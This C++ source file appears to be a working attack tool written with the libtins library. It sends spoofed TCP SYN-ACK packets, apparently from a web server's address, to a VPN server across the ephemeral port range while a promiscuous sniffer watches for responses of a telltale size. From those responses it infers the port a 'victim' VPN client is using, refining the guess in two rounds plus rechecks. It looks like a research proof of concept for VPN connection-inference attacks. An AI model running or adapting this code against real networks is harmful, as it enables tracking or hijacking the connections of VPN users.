#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>
#include <thread>


using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;


int current_spoof_port, best_port, chack_count;
bool is_running = true;
bool verbose = false;
bool rechecking = true; // rechecks inferred port if true

bool sniffed_resp = false;
string dest_ip;
string source_ip;



void print_divider(int count) {
  int i = 0;
  while (i < count) {
    if (verbose) cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    i++;
  }
}


bool handle_packet(PDU &some_pdu) {

  const IP &ip = some_pdu.rfind_pdu<IP>(); // Grab IP layer of sniffed packet

  // keep track of the last port we spoofed
  if (ip.src_addr() == source_ip) current_spoof_port = some_pdu.rfind_pdu<TCP>().dport();


  // in this case we're looking for a packet from the vpn server to the vpn client
  //
  // the src ip should be the VPN server and dest ip should be
  // public address of victim
  
  if (ip.src_addr() == dest_ip) { // dest_ip should be public VPN IP

    const uint32_t& payload = some_pdu.rfind_pdu<RawPDU>().payload_size();
    //cout << "Payload size: " << payload << "\n";
    if (payload == 99) { // could be a NAT'ed attacker packet

      cout << "sniffed response from VPN server with port: " << current_spoof_port << " and size: " << payload << " \n";
        best_port = current_spoof_port;
        sniffed_resp = true;

    }
  }

  return is_running;
}



void sniff_stuff() {
  SnifferConfiguration config;
  config.set_promisc_mode(true);
  Sniffer sniffer("any", config);
  sniffer.sniff_loop(handle_packet);

}


int recheck_port(string source_ip, int sport, string dest_ip, int found_port, int num_checks) {

  PacketSender sender;
  NetworkInterface iface("enp0s9");

  IP pkt = IP(dest_ip, source_ip) / TCP(found_port, sport);
  TCP& tcp = pkt.rfind_pdu<TCP>();
  tcp.flags(TCP::SYN | TCP::ACK);

  int i = 0;

  while (i < num_checks) {

    cout << "Sending recheck probe number " << i << "\n\n";
    sender.send(pkt, iface);
    usleep(500);
    i ++;
  }

  usleep(3000000);

  return 1;
}



// Spreads SYNs across the victim's entire port range
// coming from a specific remote_ip:port
//
int phase_two_spread(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  PacketSender sender;
  NetworkInterface iface("enp0s9");

  IP pkt = IP(dest_ip, source_ip) / TCP(40400, sport);
  TCP& tcp = pkt.rfind_pdu<TCP>();
  tcp.flags(TCP::SYN | TCP::ACK);

  int current_port = best_port;
  int count = 0;
  int i = start_port;
  bool found = false;
  

  while (i < end_port && !found) {
    tcp.dport(i);
    sender.send(pkt, iface);
    //cout << "Current port= " << i << "\n";
    usleep(500);
    count++;
    i ++;
    if (count % 50 == 0) {
       //usleep(500);
       if (verbose) cout << " Current port = " << i << ". Best port = " << best_port << ".\n";
    }

    if (best_port != 0) found = true;

  }


  current_port = best_port;
 
 if (verbose) cout << "finished round 1 w guessed port: " << current_port << "\n";

  // In round 1 we spoofed really fast (10 sleep) to get a good estimate of the
  // port in use. Round 2, we spoof slower from about 50 packets back to account
  // for the delay in response and hopefully get the exact port number in use.
  print_divider(1);
  usleep(1000000 / 2);
 // sniffed_chack = false;
  int j = current_port - 300;
  found = false;
  best_port = 0;

  while (j < (current_port + 300) && !found) {
    tcp.dport(j); // set the packets dest port to current guess
    sender.send(pkt, iface);
    if (verbose) cout << "Current guess port = " << j << " and best port = " << best_port << " \n";
    usleep(10000);
    j ++;
    if (best_port != 0) found = true;
  }


  if (verbose) cout << "finished round 2 w guessed port: " << best_port << "\n";

  return best_port;



}


int find_port(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  bool is_found = false;
  int current_port = 0;

  while (!is_found) {

    current_port = phase_two_spread(source_ip, sport, dest_ip, start_port, end_port);
    print_divider(1);

    if (verbose) cout << "finished phase 2 w possible port: " << current_port << "\n";

    is_found = true;

  }

  return current_port;

}




int main(int argc, char** argv) {

  if (argc != 4) {
    cout << "sike wrong number of args ---> (source_ip, sport, dest_ip)\n";
    return 0;
  }

  source_ip = argv[1]; // web server IP
  int sport = atoi(argv[2]); // most likely 80 or 443
  dest_ip = argv[3]; // vpn server IP
  verbose = true;

  int start_port = 32768; 
  int end_port = 61000;

  print_divider(2);

  thread sniff_thread(sniff_stuff);

  int p = find_port(source_ip, sport, dest_ip, start_port, end_port);

  //cout << p << "\n";
  print_divider(1);

  if (rechecking) int res = recheck_port(source_ip, sport, dest_ip, p, 3);
  
  is_running = false;
  sniff_thread.join();


  return p;
}
